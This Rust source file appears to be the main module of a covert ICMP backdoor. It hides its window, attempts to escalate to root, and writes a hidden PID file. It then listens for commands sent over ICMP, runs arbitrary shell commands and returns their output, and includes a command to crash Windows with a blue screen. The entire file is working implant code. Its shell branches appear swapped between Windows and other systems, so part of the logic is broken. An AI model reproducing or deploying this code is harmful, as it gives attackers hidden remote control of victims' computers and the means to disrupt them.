#![windows_subsystem = "windows"]

mod icmp;
mod persist;
mod util;
mod vars;

use bsod::bsod;
use icmp::IcmpListener;
#[cfg(not(target_os = "windows"))]
use nix::unistd::setuid;
use persist::check_persistence;
use std::env;
use std::fs::File;
use std::io::{Read, Write};
use std::path::Path;
use std::process::{exit, id, Command, Stdio};
use std::str;
use std::str::from_utf8;
use std::time::Duration;
use wait_timeout::ChildExt;

fn main() {
    if check_persistence() {
        exit(0);
    }
    if !cfg!(target_os = "windows") {
        let _ = setuid(0.into());
    }
    let mut file = if cfg!(target_os = "windows") {
        File::create("C:\\ProgramData\\.runtime").unwrap()
    } else {
        File::create("/tmp/.runtime").unwrap()
    };
    file.write_all(format!("{}", id()).as_bytes()).unwrap();
    let mut timeout = Duration::from_secs(5);
    let mut stream = IcmpListener::new();
    loop {
        let mut data = [0 as u8; 1024];
        match stream.read(&mut data) {
            Ok(_) => {
                let str_data = from_utf8(&data).unwrap();
                let str_data = str_data.trim_matches(char::from(0));
                if cmd(str_data, &mut stream, &mut timeout) {
                    break;
                }
            }
            Err(e) => {
                println!("Failed to receive data: {}", e);
            }
        }
    }
}

fn cmd(cmd: &str, stream: &mut IcmpListener, timeout: &mut Duration) -> bool {
    if cmd.eq("exit") {
        stream.write(b"OK").unwrap();
        return true;
    }
    if cmd.eq("PING") {
        stream.write(b"PONG").unwrap();
        return false;
    }
    if cmd.eq("GETOS") {
        if cfg!(target_os = "windows") {
            stream.write(b"WINDOWS").unwrap();
        } else if cfg!(target_os = "linux") {
            stream.write(b"LINUX").unwrap();
        } else if cfg!(target_os = "freebsd") {
            stream.write(b"BSD").unwrap();
        } else {
            stream.write(b"OTHER").unwrap();
        }
        return false;
    }
    if cmd.eq("BSOD") {
        bsod();
        return false;
    }
    if cmd.len() >= 2 {
        if cmd[..=1].eq("cd") {
            let path = Path::new(&cmd[3..]);
            stream
                .write(
                    match env::set_current_dir(path) {
                        Ok(_) => {
                            format!("{}", env::current_dir().unwrap().display())
                        }
                        Err(err) => {
                            format!("{}", err)
                        }
                    }
                    .as_bytes(),
                )
                .unwrap();
            return false;
        }
        if cmd[..=1].eq("DL") {
            stream.write(b"NOT IMPLEMENTED").unwrap();
            return false;
        }
        if cmd[..=1].eq("UP") {
            stream.write(b"NOT IMPLEMENTED").unwrap();
            return false;
        }
    }
    if cmd.len() >= 9 {
        if cmd[..=6].eq("TIMEOUT") {
            let secs = cmd[8..].parse();
            match secs {
                Ok(s) => {
                    *timeout = Duration::from_secs(s);
                    stream.write(b"OK").unwrap();
                    return false;
                }
                Err(_) => {
                    stream.write(b"INVALID TIME").unwrap();
                    return false;
                }
            }
        }
    }
    let mut cmd_out = if cfg!(target_os = "windows") {
        Command::new("sh")
            .arg("-c")
            .arg(&cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap()
    } else {
        Command::new("cmd.exe")
            .arg("/c")
            .arg(&cmd)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap()
    };
    let mut killed = false;
    let code = match cmd_out.wait_timeout(*timeout).unwrap() {
        Some(status) => status.code(),
        None => {
            killed = true;
            cmd_out.kill().unwrap();
            cmd_out.wait().unwrap().code()
        }
    }
    .unwrap();
    let mut out_str = String::new();
    let mut out = cmd_out.stdout.unwrap();
    let mut err_str = String::new();
    let mut err = cmd_out.stderr.unwrap();
    let _ = out.read_to_string(&mut out_str);
    let _ = err.read_to_string(&mut err_str);
    let out_str = out_str.trim();
    let err_str = err_str.trim();
    if out_str.len() + err_str.len() == 0 {
        stream
            .write(format!("NO OUTPUT | {}", code).as_bytes())
            .unwrap();
        return false;
    }
    if killed {
        stream
            .write(format!("KILLED | {}{} | {}", out_str, err_str, code).as_bytes())
            .unwrap();
        return false;
    }
    stream
        .write(format!("{}{} | {}", out_str, err_str, code).as_bytes())
        .unwrap();
    false
}
